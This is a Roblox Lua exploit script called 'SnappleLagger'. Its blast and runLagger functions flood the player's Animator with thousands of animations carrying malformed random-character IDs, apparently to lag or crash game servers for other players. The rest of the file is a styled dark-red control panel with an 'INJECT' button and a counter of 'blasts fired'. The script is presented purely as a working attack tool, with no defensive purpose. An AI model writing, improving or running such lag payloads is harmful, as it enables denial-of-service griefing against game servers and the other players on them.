local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local lplr = Players.LocalPlayer
local r = Random.new()

-- ============================================================
-- DARK RED PALETTE
-- ============================================================
local C = {
    BG          = Color3.fromRGB(10, 8, 9),
    BG2         = Color3.fromRGB(6, 5, 6),
    PANEL       = Color3.fromRGB(16, 13, 14),
    PANEL2      = Color3.fromRGB(12, 10, 11),
    LINE        = Color3.fromRGB(38, 28, 30),
    LINE2       = Color3.fromRGB(24, 18, 20),
    ACCENT      = Color3.fromRGB(120, 10, 18),     -- dark blood red
    ACCENT_HI   = Color3.fromRGB(170, 20, 30),     -- brighter dark red
    ACCENT_DIM  = Color3.fromRGB(50, 6, 10),
    ACCENT_DEEP = Color3.fromRGB(80, 8, 14),
    GLOW        = Color3.fromRGB(200, 25, 40),
    TEXT        = Color3.fromRGB(210, 205, 208),
    TEXT_HI     = Color3.fromRGB(240, 238, 240),
    TEXT_DIM    = Color3.fromRGB(120, 112, 116),
    TEXT_FAINT  = Color3.fromRGB(70, 64, 68),
    OFF         = Color3.fromRGB(80, 76, 80),
    OFF_DOT     = Color3.fromRGB(60, 56, 60),
}

-- ============================================================
-- LAG LOGIC
-- ============================================================
local lagging = false
local lagThread = nil
local blastCount = 0
local startTime = 0

local function blast()
    local char = lplr.Character
    local anim = char and char:FindFirstChildWhichIsA('Animator', true)
    if not anim then return end
    local m = ''
    repeat m = m .. utf8.char(r:NextInteger(1, 65535)) until #m >= 50
    for i = 1, 50 do
        local a = Instance.new('Animation')
        local t = 'http=507770677'
        repeat t = t .. utf8.char(r:NextInteger(1, 65535)) until #t >= 254
        a.AnimationId = (t .. m):sub(1, 256)
        local ok, tr = pcall(anim.LoadAnimation, anim, a)
        if ok then tr:Play(0, 0.0001, 0) end
    end
    blastCount = blastCount + 1
end

local function runLagger()
    while lagging do
        for i = 1, 1500 do
            if not lagging then return end
            task.spawn(blast)
            task.wait()
        end
        task.wait(10)
    end
end

-- ============================================================
-- ROOT
-- ============================================================
local gui = Instance.new("ScreenGui")
gui.Name = "SnappleLagger"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = CoreGui

-- ============================================================
-- MAIN FRAME
-- ============================================================
local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, 360, 0, 200)
main.Position = UDim2.new(0, 60, 0, 140)
main.BackgroundColor3 = C.BG
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.ClipsDescendants = true
main.Parent = gui

local mainGrad = Instance.new("UIGradient")
mainGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, C.BG2),
    ColorSequenceKeypoint.new(1, C.BG),
})
mainGrad.Rotation = 90
mainGrad.Parent = main

local glow = Instance.new("UIStroke")
glow.Color = C.GLOW
glow.Thickness = 3
glow.Transparency = 0.9
glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
glow.Parent = main

local border = Instance.new("UIStroke")
border.Color = C.ACCENT_DEEP
border.Thickness = 1
border.Transparency = 0.15
border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
border.Parent = main

local bgPulse = Instance.new("Frame")
bgPulse.Size = UDim2.new(1, 0, 1, 0)
bgPulse.BackgroundColor3 = C.ACCENT
bgPulse.BackgroundTransparency = 0.97
bgPulse.BorderSizePixel = 0
bgPulse.ZIndex = 0
bgPulse.Parent = main

-- ============================================================
-- CORNER BRACKETS (sharp)
-- ============================================================
local function bracket(pos, size, anchor)
    local c = Instance.new("Frame")
    c.BackgroundColor3 = C.ACCENT_HI
    c.BorderSizePixel = 0
    c.Size = size
    c.Position = pos
    c.AnchorPoint = anchor
    c.ZIndex = 20
    c.Parent = main
end
bracket(UDim2.new(0, 0, 0, 0), UDim2.new(0, 18, 0, 2), Vector2.new(0, 0))
bracket(UDim2.new(0, 0, 0, 0), UDim2.new(0, 2, 0, 18), Vector2.new(0, 0))
bracket(UDim2.new(1, 0, 0, 0), UDim2.new(0, 18, 0, 2), Vector2.new(1, 0))
bracket(UDim2.new(1, 0, 0, 0), UDim2.new(0, 2, 0, 18), Vector2.new(1, 0))
bracket(UDim2.new(0, 0, 1, 0), UDim2.new(0, 18, 0, 2), Vector2.new(0, 1))
bracket(UDim2.new(0, 0, 1, 0), UDim2.new(0, 2, 0, 18), Vector2.new(0, 1))
bracket(UDim2.new(1, 0, 1, 0), UDim2.new(0, 18, 0, 2), Vector2.new(1, 1))
bracket(UDim2.new(1, 0, 1, 0), UDim2.new(0, 2, 0, 18), Vector2.new(1, 1))

-- ============================================================
-- HEADER
-- ============================================================
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 36)
header.Position = UDim2.new(0, 0, 0, 0)
header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
header.BackgroundTransparency = 0.25
header.BorderSizePixel = 0
header.ZIndex = 3
header.Parent = main

local headerGrad = Instance.new("UIGradient")
headerGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 4, 8)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 3, 4)),
})
headerGrad.Rotation = 90
headerGrad.Parent = header

local headerTopLine = Instance.new("Frame")
headerTopLine.Size = UDim2.new(1, 0, 0, 1)
headerTopLine.Position = UDim2.new(0, 0, 0, 0)
headerTopLine.BackgroundColor3 = C.ACCENT
headerTopLine.BackgroundTransparency = 0.4
headerTopLine.BorderSizePixel = 0
headerTopLine.ZIndex = 4
headerTopLine.Parent = header

local headerLine = Instance.new("Frame")
headerLine.Size = UDim2.new(1, 0, 0, 1)
headerLine.Position = UDim2.new(0, 0, 1, -1)
headerLine.BackgroundColor3 = C.ACCENT_DEEP
headerLine.BorderSizePixel = 0
headerLine.ZIndex = 4
headerLine.Parent = header

-- Logo (sharp square)
local logo = Instance.new("Frame")
logo.Size = UDim2.new(0, 18, 0, 18)
logo.Position = UDim2.new(0, 12, 0.5, -9)
logo.BackgroundColor3 = C.ACCENT
logo.BorderSizePixel = 0
logo.ZIndex = 5
logo.Parent = header

local logoInner = Instance.new("Frame")
logoInner.Size = UDim2.new(0, 8, 0, 8)
logoInner.Position = UDim2.new(0.5, 0, 0.5, 0)
logoInner.AnchorPoint = Vector2.new(0.5, 0.5)
logoInner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
logoInner.BorderSizePixel = 0
logoInner.ZIndex = 6
logoInner.Parent = logo

-- Brand
local brand = Instance.new("TextLabel")
brand.Size = UDim2.new(0, 180, 1, 0)
brand.Position = UDim2.new(0, 38, 0, 0)
brand.BackgroundTransparency = 1
brand.Text = "SNAPPLE"
brand.TextColor3 = C.TEXT_HI
brand.Font = Enum.Font.Code
brand.TextSize = 15
brand.TextXAlignment = Enum.TextXAlignment.Left
brand.ZIndex = 5
brand.Parent = header

local brandSub = Instance.new("TextLabel")
brandSub.Size = UDim2.new(0, 180, 0, 10)
brandSub.Position = UDim2.new(0, 39, 0, 21)
brandSub.BackgroundTransparency = 1
brandSub.Text = "// LAGGER"
brandSub.TextColor3 = C.ACCENT_HI
brandSub.Font = Enum.Font.Code
brandSub.TextSize = 10
brandSub.TextXAlignment = Enum.TextXAlignment.Left
brandSub.ZIndex = 5
brandSub.Parent = header

-- Right corner id code
local idCode = Instance.new("TextLabel")
idCode.Size = UDim2.new(0, 120, 1, 0)
idCode.Position = UDim2.new(1, -132, 0, 0)
idCode.BackgroundTransparency = 1
idCode.Text = "SL-04 // RED"
idCode.TextColor3 = C.TEXT_FAINT
idCode.Font = Enum.Font.Code
idCode.TextSize = 10
idCode.TextXAlignment = Enum.TextXAlignment.Right
idCode.ZIndex = 5
idCode.Parent = header

-- ============================================================
-- SEPARATOR
-- ============================================================
local sep = Instance.new("Frame")
sep.Size = UDim2.new(1, 0, 0, 1)
sep.Position = UDim2.new(0, 0, 0, 36)
sep.BackgroundColor3 = C.LINE2
sep.BorderSizePixel = 0
sep.ZIndex = 3
sep.Parent = main

-- ============================================================
-- STATS ROW
-- ============================================================
local statsRow = Instance.new("Frame")
statsRow.Size = UDim2.new(1, -24, 0, 40)
statsRow.Position = UDim2.new(0, 12, 0, 46)
statsRow.BackgroundTransparency = 1
statsRow.ZIndex = 3
statsRow.Parent = main

local function makeStat(xScale, xOffset, label)
    local box = Instance.new("Frame")
    box.Size = UDim2.new(xScale, -4, 1, 0)
    box.Position = UDim2.new(xOffset, 0, 0, 0)
    box.BackgroundColor3 = C.PANEL
    box.BorderSizePixel = 0
    box.ZIndex = 3
    box.Parent = statsRow

    local bs = Instance.new("UIStroke")
    bs.Color = C.LINE
    bs.Thickness = 1
    bs.Transparency = 0.3
    bs.Parent = box

    -- left edge marker
    local edge = Instance.new("Frame")
    edge.Size = UDim2.new(0, 2, 1, 0)
    edge.Position = UDim2.new(0, 0, 0, 0)
    edge.BackgroundColor3 = C.ACCENT_DEEP
    edge.BorderSizePixel = 0
    edge.ZIndex = 4
    edge.Parent = box

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -14, 0, 11)
    lbl.Position = UDim2.new(0, 10, 0, 4)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = C.TEXT_FAINT
    lbl.Font = Enum.Font.Code
    lbl.TextSize = 10
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 4
    lbl.Parent = box

    local val = Instance.new("TextLabel")
    val.Size = UDim2.new(1, -14, 0, 18)
    val.Position = UDim2.new(0, 10, 0, 16)
    val.BackgroundTransparency = 1
    val.Text = "0"
    val.TextColor3 = C.TEXT_HI
    val.Font = Enum.Font.Code
    val.TextSize = 16
    val.TextXAlignment = Enum.TextXAlignment.Left
    val.ZIndex = 4
    val.Parent = box

    return val, edge
end

local statBlasts, edge1 = makeStat(0.5, 0, "BLASTS FIRED")
local statUptime, edge2 = makeStat(0.5, 0.5, "UPTIME")

-- ============================================================
-- BUTTON (sharp)
-- ============================================================
local btn = Instance.new("TextButton")
btn.Size = UDim2.new(1, -24, 0, 56)
btn.Position = UDim2.new(0, 12, 1, -68)
btn.BackgroundColor3 = C.PANEL2
btn.BorderSizePixel = 0
btn.Text = ""
btn.AutoButtonColor = false
btn.ClipsDescendants = true
btn.ZIndex = 4
btn.Parent = main

local btnGrad = Instance.new("UIGradient")
btnGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 14, 16)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 8, 9)),
})
btnGrad.Rotation = 90
btnGrad.Parent = btn

local btnStroke = Instance.new("UIStroke")
btnStroke.Color = C.ACCENT_DEEP
btnStroke.Thickness = 1
btnStroke.Transparency = 0.2
btnStroke.Parent = btn

-- Left accent bar
local btnAccent = Instance.new("Frame")
btnAccent.Size = UDim2.new(0, 3, 1, 0)
btnAccent.Position = UDim2.new(0, 0, 0, 0)
btnAccent.BackgroundColor3 = C.ACCENT
btnAccent.BorderSizePixel = 0
btnAccent.ZIndex = 5
btnAccent.Parent = btn

-- Corner ticks inside button
local function tick(xPos, xAnchor, yPos, yAnchor, w, h)
    local t = Instance.new("Frame")
    t.Size = UDim2.new(0, w, 0, h)
    t.Position = UDim2.new(xPos, 0, yPos, 0)
    t.AnchorPoint = Vector2.new(xAnchor, yAnchor)
    t.BackgroundColor3 = C.ACCENT_DEEP
    t.BorderSizePixel = 0
    t.ZIndex = 6
    t.Parent = btn
end
tick(1, 1, 0, 0, 8, 1)
tick(1, 1, 0, 0, 1, 8)
tick(1, 1, 1, 1, 8, 1)
tick(1, 1, 1, 1, 1, 8)

local btnLabel = Instance.new("TextLabel")
btnLabel.Size = UDim2.new(1, -60, 0, 22)
btnLabel.Position = UDim2.new(0, 16, 0, 6)
btnLabel.BackgroundTransparency = 1
btnLabel.Text = "INJECT"
btnLabel.TextColor3 = C.TEXT_HI
btnLabel.Font = Enum.Font.Code
btnLabel.TextSize = 18
btnLabel.TextXAlignment = Enum.TextXAlignment.Left
btnLabel.ZIndex = 5
btnLabel.Parent = btn

local btnSub = Instance.new("TextLabel")
btnSub.Size = UDim2.new(1, -60, 0, 12)
btnSub.Position = UDim2.new(0, 17, 0, 30)
btnSub.BackgroundTransparency = 1
btnSub.Text = "ACTIVATE LAG PAYLOAD"
btnSub.TextColor3 = C.TEXT_FAINT
btnSub.Font = Enum.Font.Code
btnSub.TextSize = 10
btnSub.TextXAlignment = Enum.TextXAlignment.Left
btnSub.ZIndex = 5
btnSub.Parent = btn

local chevron = Instance.new("TextLabel")
chevron.Size = UDim2.new(0, 40, 1, 0)
chevron.Position = UDim2.new(1, -50, 0, 0)
chevron.BackgroundTransparency = 1
chevron.Text = "[ >> ]"
chevron.TextColor3 = C.ACCENT_HI
chevron.Font = Enum.Font.Code
chevron.TextSize = 14
chevron.ZIndex = 5
chevron.Parent = btn

-- Shine sweep
local shine = Instance.new("Frame")
shine.Size = UDim2.new(0, 90, 1, 0)
shine.Position = UDim2.new(0, -90, 0, 0)
shine.BackgroundColor3 = C.GLOW
shine.BackgroundTransparency = 0.85
shine.BorderSizePixel = 0
shine.ZIndex = 6
shine.Parent = btn

local shineGrad = Instance.new("UIGradient")
shineGrad.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 1),
    NumberSequenceKeypoint.new(0.5, 0),
    NumberSequenceKeypoint.new(1, 1),
})
shineGrad.Parent = shine

-- ============================================================
-- SCANLINES
-- ============================================================
local scanWrap = Instance.new("Frame")
scanWrap.Size = UDim2.new(1, 0, 1, 0)
scanWrap.BackgroundTransparency = 1
scanWrap.ClipsDescendants = true
scanWrap.ZIndex = 25
scanWrap.Parent = main

for i = 0, 32 do
    local l = Instance.new("Frame")
    l.Size = UDim2.new(1, 0, 0, 1)
    l.Position = UDim2.new(0, 0, 0, i * 7)
    l.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    l.BackgroundTransparency = 0.965
    l.BorderSizePixel = 0
    l.ZIndex = 25
    l.Parent = scanWrap
end

local scanLine = Instance.new("Frame")
scanLine.Size = UDim2.new(1, 0, 0, 1)
scanLine.BackgroundColor3 = C.ACCENT_HI
scanLine.BackgroundTransparency = 0.7
scanLine.BorderSizePixel = 0
scanLine.ZIndex = 26
scanLine.Parent = main

-- ============================================================
-- STATE
-- ============================================================
local pulse = 0
local scanY = 0

local function setActive(on)
    if on then
        btnLabel.Text = "EJECT"
        btnSub.Text = "TERMINATE LAG PAYLOAD"
        btnLabel.TextColor3 = C.TEXT_HI
        btnSub.TextColor3 = C.ACCENT_HI
        btnAccent.BackgroundColor3 = C.ACCENT_HI
        btnStroke.Color = C.ACCENT_HI
        btnStroke.Transparency = 0
        btnGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 8, 14)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(36, 4, 8)),
        })
        chevron.TextColor3 = C.TEXT_HI
        chevron.Text = "[ << ]"
        border.Color = C.ACCENT_HI
        border.Transparency = 0.05
        idCode.TextColor3 = C.ACCENT_HI
        idCode.Text = "SL-04 // ARMED"
    else
        btnLabel.Text = "INJECT"
        btnSub.Text = "ACTIVATE LAG PAYLOAD"
        btnLabel.TextColor3 = C.TEXT_HI
        btnSub.TextColor3 = C.TEXT_FAINT
        btnAccent.BackgroundColor3 = C.ACCENT
        btnStroke.Color = C.ACCENT_DEEP
        btnStroke.Transparency = 0.2
        btnGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 14, 16)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 8, 9)),
        })
        chevron.TextColor3 = C.ACCENT_HI
        chevron.Text = "[ >> ]"
        border.Color = C.ACCENT_DEEP
        border.Transparency = 0.15
        idCode.TextColor3 = C.TEXT_FAINT
        idCode.Text = "SL-04 // RED"
    end

    TweenService:Create(main, TweenInfo.new(0.08), {
        BackgroundColor3 = on and Color3.fromRGB(30, 4, 8) or C.BG
    }):Play()
    task.delay(0.08, function()
        TweenService:Create(main, TweenInfo.new(0.2), {
            BackgroundColor3 = C.BG
        }):Play()
    end)
end

-- ============================================================
-- LOOP
-- ============================================================
RunService.RenderStepped:Connect(function(dt)
    pulse = pulse + dt
    local p = (math.sin(pulse * 5) + 1) / 2

    if lagging then
        glow.Transparency = 0.6 + p * 0.25
        bgPulse.BackgroundTransparency = 0.95 - p * 0.03
    else
        glow.Transparency = 0.9
        bgPulse.BackgroundTransparency = 0.97
    end

    scanY = scanY + dt * 0.4
    if scanY > 1 then scanY = 0 end
    scanLine.Position = UDim2.new(0, 0, scanY, 0)
    scanLine.BackgroundTransparency = 0.7 + math.sin(scanY * math.pi) * 0.2

    if lagging then
        statBlasts.Text = tostring(blastCount)
        local up = os.time() - startTime
        local mm = math.floor(up / 60)
        local ss = up % 60
        statUptime.Text = string.format("%02d:%02d", mm, ss)
        edge1.BackgroundColor3 = C.ACCENT_HI
        edge2.BackgroundColor3 = C.ACCENT_HI
    else
        edge1.BackgroundColor3 = C.ACCENT_DEEP
        edge2.BackgroundColor3 = C.ACCENT_DEEP
    end
end)

-- ============================================================
-- INPUT
-- ============================================================
btn.MouseEnter:Connect(function()
    if not lagging then
        TweenService:Create(btn, TweenInfo.new(0.1), {
            BackgroundColor3 = Color3.fromRGB(24, 16, 18)
        }):Play()
    end
end)

btn.MouseLeave:Connect(function()
    if not lagging then
        TweenService:Create(btn, TweenInfo.new(0.1), {
            BackgroundColor3 = C.PANEL2
        }):Play()
    end
end)

btn.MouseButton1Click:Connect(function()
    lagging = not lagging

    TweenService:Create(btn, TweenInfo.new(0.06), {
        Size = UDim2.new(1, -28, 0, 54),
        Position = UDim2.new(0, 14, 1, -67)
    }):Play()
    task.delay(0.06, function()
        TweenService:Create(btn, TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(1, -24, 0, 56),
            Position = UDim2.new(0, 12, 1, -68)
        }):Play()
    end)

    shine.Position = UDim2.new(0, -90, 0, 0)
    TweenService:Create(shine, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        Position = UDim2.new(1, 10, 0, 0)
    }):Play()

    setActive(lagging)

    if lagging then
        blastCount = 0
        startTime = os.time()
        if not lagThread or coroutine.status(lagThread) == "dead" then
            lagThread = coroutine.create(runLagger)
            coroutine.resume(lagThread)
        end
    end
end)

-- ============================================================
-- ENTRY
-- ============================================================
main.BackgroundTransparency = 1
main.Position = UDim2.new(0, 60, 0, 180)
main.Size = UDim2.new(0, 360, 0, 170)

TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
    BackgroundTransparency = 0,
    Position = UDim2.new(0, 60, 0, 140),
    Size = UDim2.new(0, 360, 0, 200),
}):Play()

for _, d in ipairs(main:GetDescendants()) do
    if d:IsA("TextLabel") then
        local orig = d.TextTransparency
        d.TextTransparency = 1
        TweenService:Create(d, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            TextTransparency = orig
        }):Play()
    end
end

print("[SNAPPLE // LAGGER v4.0 :: DARK RED] loaded")
